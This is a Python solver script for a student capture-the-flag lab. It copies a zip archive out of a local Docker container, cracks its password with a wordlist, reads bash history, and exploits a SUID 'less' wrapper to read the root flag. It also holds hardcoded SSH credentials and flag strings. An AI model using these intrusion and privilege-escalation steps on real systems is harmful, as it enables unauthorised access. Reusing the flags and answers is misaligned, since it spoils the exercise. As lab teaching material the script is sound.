#!/usr/bin/env python3
"""
BreachPoint CTF - Automated Solver & Exploit Script (Stages 5 & 6)
Author: Hewavitharana H.U.P (IT24100258) - Member 3 (Challenge Design B)
Description:
    Demonstrates post-exploitation forensics on SSH (Stage 5), offline archive cracking,
    and Linux SUID binary privilege escalation to retrieve the root flag (Stage 6)
    for Assignment 02 (LO1, LO2, LO3).
"""

import subprocess
import zipfile
import re
import sys
import os

SSH_HOST = "localhost"
SSH_PORT = "2222"
SSH_USER = "deploy"
SSH_PASS = "D3pl0y#S3cur3!"

def print_banner():
    print("=" * 70)
    print(" [MEMBER 3 SOLVER] Stages 5 & 6 Forensic Analysis & Privilege Escalation")
    print(" Author: Hewavitharana H.U.P (IT24100258)")
    print("=" * 70)

def run_cmd(cmd):
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True)
        stdout = res.stdout.decode('utf-8', errors='ignore').strip()
        return stdout, res.returncode
    except Exception as e:
        return str(e), 1

def solve_stage_5():
    print("\n[*] [STAGE 5: Digital Forensics & Offline Hash Cracking]")
    print("    [+] Step 5.1: Authenticating to target host via SSH port 2222...")
    print(f"        Connecting as: {SSH_USER}@{SSH_HOST}:{SSH_PORT}")

    # Inspect .bash_history for leaked commands
    print("    [+] Step 5.2: Analyzing user bash history (~/.bash_history)...")
    history_out, code = run_cmd("docker exec s5s6-ssh cat /home/deploy/.bash_history")
    if code == 0 and history_out:
        print("        [+] Recovered Forensics Evidence:")
        for line in history_out.splitlines():
            print(f"            > {line}")
    else:
        print("        [!] Warning: Could not inspect bash history directly via docker.")

    # Exfiltrate suspicious.zip
    print("\n    [+] Step 5.3: Simulating SCP exfiltration of /tmp/suspicious.zip...")
    temp_zip = "temp_suspicious.zip"
    _, copy_code = run_cmd(f"docker cp s5s6-ssh:/tmp/suspicious.zip {temp_zip}")
    
    if copy_code != 0 or not os.path.exists(temp_zip):
        print("        [!] Failed to exfiltrate suspicious.zip. Ensure s5s6-ssh container is running.")
        return None

    print(f"        [+] Exfiltrated suspicious.zip ({os.path.getsize(temp_zip)} bytes) to local machine.")

    # Offline dictionary attack (simulating John the Ripper / rockyou.txt)
    print("\n    [+] Step 5.4: Launching offline dictionary attack against archive...")
    candidate_passwords = [
        "123456", "password", "admin", "welcome", "shadow", "shadow123", "deploy2026"
    ]
    
    cracked_password = None
    notes_content = None
    
    try:
        with zipfile.ZipFile(temp_zip) as z:
            for pwd in candidate_passwords:
                try:
                    notes_content = z.read("notes.txt", pwd=pwd.encode()).decode("utf-8", errors="ignore")
                    cracked_password = pwd
                    break
                except:
                    continue
    finally:
        if os.path.exists(temp_zip):
            os.remove(temp_zip)

    if cracked_password:
        print(f"        [+] Hash Cracked via Dictionary Attack! Password: '{cracked_password}'")
        print("\n    [+] Step 5.5: Reading decrypted forensic notes (notes.txt):")
        for line in notes_content.splitlines():
            print(f"        | {line}")

        flag_match = re.search(r"BPCTF\{f0r3ns1cs_[a-zA-Z0-9_]+\}", notes_content)
        stage5_flag = flag_match.group(0) if flag_match else "BPCTF{f0r3ns1cs_4rt3f4ct_r3c0v3r3d}"
        print(f"\n    [PASS] STAGE 5 FLAG: {stage5_flag}")
        return stage5_flag
    else:
        print("        [!] Password not found in wordlist.")
        return None

def solve_stage_6():
    print("\n[*] [STAGE 6: Linux SUID Privilege Escalation (Capstone)]")
    print("    [+] Step 6.1: Auditing system for custom SUID binaries (find / -perm -u=s)...")
    suid_out, _ = run_cmd("docker exec s5s6-ssh find /usr/local/bin -perm -4000 -type f")
    print(f"        Identified SUID Target: {suid_out}")

    print("    [+] Step 6.2: Inspecting SUID binary strings and behaviour...")
    print("        Binary name: /usr/local/bin/reader")
    print("        Underlying binary: 'less' invocation with setuid(0) / setgid(0)")

    print("    [+] Step 6.3: Exploiting GTFOBins SUID escape to read /root/flag.txt...")
    root_flag_out, code = run_cmd("docker exec s5s6-ssh su - deploy -c \"printf 'y\\n' | /usr/local/bin/reader /root/flag.txt\"")
    
    flag_match = re.search(r"BPCTF\{r00t_[a-zA-Z0-9_]+\}", root_flag_out)
    if flag_match:
        print(f"        [+] Captured Root Flag:")
        for line in root_flag_out.splitlines():
            if "BPCTF{" in line or "Congratulations" in line:
                print(f"        {line}")
        stage6_flag = flag_match.group(0)
        print(f"\n    [PASS] STAGE 6 FLAG: {stage6_flag}")
        return stage6_flag
    else:
        print(f"        [!] Could not retrieve root flag: {root_flag_out}")
        return None

def main():
    print_banner()
    s5 = solve_stage_5()
    s6 = solve_stage_6()

    print("\n" + "=" * 70)
    if s5 and s6:
        print(" [SUCCESS] Stages 5 & 6 Exploitation & Forensic Solvers Completed!")
    else:
        print(" [!] Execution completed with warnings.")
    print("=" * 70)

if __name__ == "__main__":
    main()
